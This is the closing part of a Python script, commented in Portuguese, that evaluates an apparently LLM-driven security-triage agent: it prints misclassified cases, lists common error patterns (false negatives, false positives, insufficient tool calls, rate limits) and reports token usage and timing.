        print(f"--- Caso {linha['id']}: {linha['descricao']} ---")
        print(f"  Ferramentas usadas: {linha['ferramentas']} ")
        print(f"  Justificativa obtida: {str(linha['justificativa'])[:300]} ")
        print()
    print("Padrões de erro mais comuns em agentes de segurança como este: ")
    print("  1. Falso negativo (ALERTA quando deveria ser COMPROMETIDO): o mais perigoso. ")
    print("     Causa: agente não chamou todas as ferramentas relevantes, ")
    print("     ou não aplicou corretamente os critérios de veredicto. ")
    print("  2. Falso positivo (COMPROMETIDO quando deveria ser ALERTA): ")
    print("     Causa: agente sobre-estimou a gravidade de portas de risco ")
    print("     abertas sem evidência de comprometimento de arquivos. ")
    print("  3. Chamadas de ferramenta insuficientes: max_steps muito baixo ")
    print("     impede verificar todos os arquivos em casos complexos. ")
    print("  4. Rate limit (429): mesmo com retry, um tier muito restrito pode ")
    print("     exigir aumentar PAUSA_ENTRE_CASOS_SEGUNDOS ou reduzir max_tokens. ")

print("\n✅ Script executado do início ao fim sem intervenção manual. ")

# =============================================================================
# SEÇÃO 11: USO DE TOKENS E CUSTO
# =============================================================================

if llm.usage:
    uso_df = pd.DataFrame(llm.usage)
    print(f"Total de chamadas ao modelo: {len(uso_df)} ")
    print(f"Tokens de entrada:  {uso_df['tokens_in'].sum():,} ")
    print(f"Tokens de saída:    {uso_df['tokens_out'].sum():,} ")
    print(f"Tempo total (s):    {uso_df['seconds'].sum():.1f}s ")
    print(f"Tempo médio/chamada: {uso_df['seconds'].mean():.2f}s ")
else:
    print("Registro de uso não disponível para o modelo configurado. ")
